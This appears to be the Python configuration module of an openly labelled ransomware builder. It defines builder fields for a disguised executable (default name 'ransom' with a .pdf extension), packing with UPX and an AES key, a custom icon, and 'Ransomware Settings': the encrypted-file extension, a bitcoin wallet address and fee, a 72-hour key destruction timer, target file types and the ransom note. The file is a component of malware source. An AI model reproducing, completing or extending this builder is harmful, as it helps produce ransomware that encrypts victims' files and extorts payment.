# -*- coding: utf-8 -*-
'''
@summary: Crypter Exe Builder: Base schema and config
@author: MLS
'''

# Import libs
import re
from ordereddict import OrderedDict

## VERSION
MAJ_VERSION = "1"
MIN_VERSION = "03"

# TITLE
TITLE = "Crypter Builder v%s.%s" % (MAJ_VERSION, MIN_VERSION)

## LANGUAGE
SUPPORTED_LANGUAGES = [
    u"English",
    #u"Русский"
    ]

DEFAULT_LANGUAGE = "English"

# English Form text
english_language_form_labels = {
    "language_settings_sizer": "Language"
    }

## DEFAULT FILETYPES TO ENCRYPT
# The default list of filetypes which can be encrypted
ENCRYPTABLE_FILETYPES = [
    # GENERAL FORMATS
    "sln",

    # IMAGE FORMATS
    "jpg", "png",

    # VIDEO FORMATS
    "mp4", "avi", "mkv",
    
    # DOCUMENT FORMATS
    "doc", "docx", "txt", "pdf",

    # SOUND FORMATS
    "mp3",

    # EXE FORMATS
    "exe", "msi", "php",

    # COMPRESSION FORMATS
    "tgz", "zip", "rar"
    ]


## CONFIGURATION
'''
@summary: The builder configuration dictionary containing the configuration options loaded into the GUI
@note: To add a new field, adjust the GUI form appropriately and add the settings for the new
field to this dictionary
'''
BUILDER_CONFIG_ITEMS = OrderedDict([
    (
        "builder_language", {
            "label": "Builder Language",
            "label_object_name": "BuilderLanguageLabel",
            "input_object_name": "BuilderLanguageChoice",
            "regex": re.compile(ur"^%s$" % "|".join(SUPPORTED_LANGUAGES)), # Choice box so validation not required
            "example": "English or Русский",
            "input_requirement": "One of the supported languages",
            "config_area": "Language",
            "default": "English"
            }
    ),
    (
        "debug_level", {
            "label": "Debug verbosity level",
            "label_object_name": "DebugLevelLabel",
            "input_object_name": "DebugLevelChoice",
            "regex": re.compile("^.*$"), # Choice box so validation not required
            "example": "0 - Minimal",
            "input_requirement": "Build process debug level",
            "config_area": "Debug",
            "default": "1 - Low"
            }
    ),
    (
        "filename", {
            "label": "Filename",
            "label_object_name": "FilenameLabel",
            "input_object_name": "FilenameTextCtrl",
            "regex": re.compile("^([A-Za-z][A-Za-z0-9_-]*)?$"),
            "input_requirement": "A series of alphanumeric character(s), beginning with a letter",
            "example": "invoice_pdf",
            "default": "ransom",
            "config_area": "Binary Settings"
            }
    ),
    (
        "extension", {
            "label": "Extension",
            "label_object_name": "ExtensionLabel",
            "input_object_name": "ExtensionTextCtrl",
            "regex": re.compile("^[A-Za-z0-9]*$"),
            "example": "pdf",
            "input_requirement": "A series of alphanumeric character(s)",
            "default": "pdf",
            "config_area": "Binary Settings"
            }
    ),
    (
        "pyinstaller_aes_key", {
            "label": "PyInstaller AES Key",
            "label_object_name": "PyinstallerAesKeyLabel",
            "input_object_name": "PyinstallerAesKeyTextCtrl",
            "regex": re.compile("^([A-Za-z0-9]{16})?$"),
            "example": "093AC769F6557577452E9DB2C74B984A",
            "input_requirement": "A 16 byte(character) string of alphanumeric characters",
            "config_area": "Binary Settings"
            }
    ),
    (
        "upx_dir", {
            "label": "UPX Packer Directory",
            "label_object_name": "UpxDirLabel",
            "input_object_name": "UpxDirPicker",
            "regex": re.compile("^.*$"),
            "example": "C:\\Program Files\\upx394w",
            "input_requirement": "A path pointing to the UPX Packer directory",
            "default": "",
            "config_area": "Binary Settings"
            }
    ),
    (
        "icon_file", {
            "label": "Icon",
            "label_object_name": "IconLabel",
            "input_object_name": "IconFilePicker",
            "regex": re.compile("^.*$"),
            "example": "C:\\Users\\test\\icon.ico",
            "input_requirement": "A file path pointing to the location of a valid .ico icon file",
            "default": "",
            "config_area": "Binary Settings"
            }
    ),
    (
        "encrypted_file_extension", {
            "label": "Encrypted File Extension",
            "label_object_name": "EncryptedFileExtensionLabel",
            "input_object_name": "EncryptedFileExtensionTextCtrl",
            "regex": re.compile("^[A-Za-z0-9]*$"),
            "example": "locked",
            "input_requirement": "A series of alphanumeric character(s)",
            "config_area": "Ransomware Settings",
            "default": "locked"
            }
    ),
    (
        "wallet_address", {
            "label": "Wallet Address",
            "label_object_name": "WalletAddressLabel",
            "input_object_name": "WalletAddressTextCtrl",
            "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
            "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
            "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
                                 " characters (26-35 characters in length",
            "config_area": "Ransomware Settings",
            "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
            }
    ),
    (
        "bitcoin_fee", {
            "label": "Bitcoin Fee",
            "label_object_name": "BitcoinFeeLabel",
            "input_object_name": "BitcoinFeeTextCtrl",
            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
            "example": "0.0897",
            "input_requirement": "A valid integer or floating point number",
            "config_area": "Ransomware Settings",
            "default": "1.0"
            }
     ),
    (
        "key_destruction_time", {
            "label": "Key Destruction Time(s)",
            "label_object_name": "KeyDestructionTimeLabel",
            "input_object_name": "KeyDestructionTimeTextCtrl",
            "regex": re.compile("^[0-9]*$"),
            "example": "259200",
            "input_requirement": "A valid integer or floating point number",
            "config_area": "Ransomware Settings",
            "default": "259200"
            }
    ),
    (
        "max_file_size_to_encrypt", {
            "label": "Max File Size to Encrypt",
            "label_object_name": "MaxFileSizeLabel",
            "input_object_name": "MaxFileSizeTextCtrl",
            "regex": re.compile("^[0-9]*$"),
            "input_requirement": "A valid integer",
            "example": "512",
            "config_area": "Ransomware Settings",
            "default": "512"
            }
    ),
    (
        "filetypes_to_encrypt", {
            "label": "Filetypes to Encrypt",
            "label_object_name": "FiletypesToEncryptLabel",
            "input_object_name": "FiletypesToEncryptTextCtrl",
            "regex": re.compile("^([A-Za-z0-9]+(,[A-Za-z0-9]+)*)?$"),
            "example": "pdf,exe,msi,doc",
            "input_requirement": "A comma-separated list of filetypes to encrypt",
            "config_area": "Ransomware Settings",
            "default": ENCRYPTABLE_FILETYPES
        }
    ),
    (
        "ransom_message", {
            "label": "Ransom Message",
            "input_object_name": "RansomMessageTextCtrl",
            "regex": re.compile("^.*$", re.MULTILINE),
            "example": "",
            "input_requirement": "Ransom message/note",
            "config_area": "Ransomware Settings",
            "default": ""
        }
    )
    ])

'''
@summary: Runtime configuration items. To be written to the Ransomware's runtime config file
'''
RUNTIME_CONFIG_ITEMS = [
    "encrypted_file_extension",
    "wallet_address",
    "bitcoin_fee",
    "key_destruction_time",
    "max_file_size_to_encrypt",
    "filetypes_to_encrypt",
    "ransom_message"
    ]

RUNTIME_CONFIG_PATH = "Resources/runtime.cfg"

# ERRORS
ERROR_INVALID_DATA = 13
ERROR_INVALID_CONFIG_FILE = 110
ERROR_CANNOT_WRITE = 80
ERROR_FILE_NOT_FOUND = 2